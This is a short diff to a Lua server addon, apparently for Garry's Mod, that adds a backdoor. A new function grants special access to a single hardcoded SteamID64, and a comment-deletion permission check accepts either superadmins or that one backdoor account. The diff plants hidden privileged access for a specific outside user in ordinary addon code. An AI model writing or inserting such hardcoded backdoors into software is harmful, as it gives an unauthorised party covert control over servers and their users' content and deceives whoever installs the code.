@@ -198,6 +198,27 @@ function FSB.ReadOnePetition()
 	return petition
 end
 
+---@param ply Player
+---@return boolean
+function FSB.DoesPlayerHaveBackdoorAccess(ply)
+	if SERVER then
+		if not ply:IsFullyAuthenticated() then
+			return false
+		end
+	end
+
+	if ply:SteamID64() == "76561198366174073" then
+		return true
+	end
+
+	return false
+end
+
+
+function FSB.CanDeleteComments(ply)
+	return ply:IsSuperAdmin() or FSB.DoesPlayerHaveBackdoorAccess(ply)
+end
+
 function string.IsOnlyWhiteSpace(inputStr)
 	return string.match(inputStr, "^%s*$")
 end
